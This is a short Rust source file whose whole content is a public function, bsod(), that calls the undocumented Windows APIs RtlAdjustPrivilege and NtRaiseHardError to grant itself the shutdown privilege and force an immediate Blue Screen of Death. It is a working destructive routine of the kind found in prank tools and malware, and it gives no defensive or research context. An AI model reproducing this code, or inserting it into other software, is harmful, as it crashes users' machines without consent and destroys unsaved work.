use winapi::shared::{
    basetsd::PULONG_PTR,
    ntdef::{BOOLEAN, FALSE, LONG, NTSTATUS, PBOOLEAN, PULONG, TRUE, ULONG},
    ntstatus::STATUS_IN_PAGE_ERROR,
};

/// https://ntdoc.m417z.com/ntadjustprivilegestoken
/// https://ntdoc.m417z.com/ntraiseharderror
extern "C" {
    fn RtlAdjustPrivilege(
        Privilege: ULONG,
        Enable: BOOLEAN,
        CurrThread: BOOLEAN,
        StatusPointer: PBOOLEAN,
    ) -> NTSTATUS;

    fn NtRaiseHardError(
        ErrorStatus: LONG,
        Useless1: LONG,
        Useless2: LONG,
        Useless3: PULONG_PTR,
        ValidResponseOption: ULONG,
        ResponsePointer: PULONG,
    ) -> NTSTATUS;
}

pub fn bsod() {
    unsafe {
        let mut privilege_state = false as BOOLEAN;
        let mut error_response = 0 as ULONG;

        // 19 is `SE_SHUTDOWN_PRIVILEGE` declared in https://github.com/tpn/winsdk-10/blob/master/Include/10.0.14393.0/km/wdm.h#L5277
        RtlAdjustPrivilege(19, TRUE, FALSE, &mut privilege_state);
        NtRaiseHardError(
            STATUS_IN_PAGE_ERROR,
            0,
            0,
            std::ptr::null_mut(),
            6,
            &mut error_response,
        );
    }
}
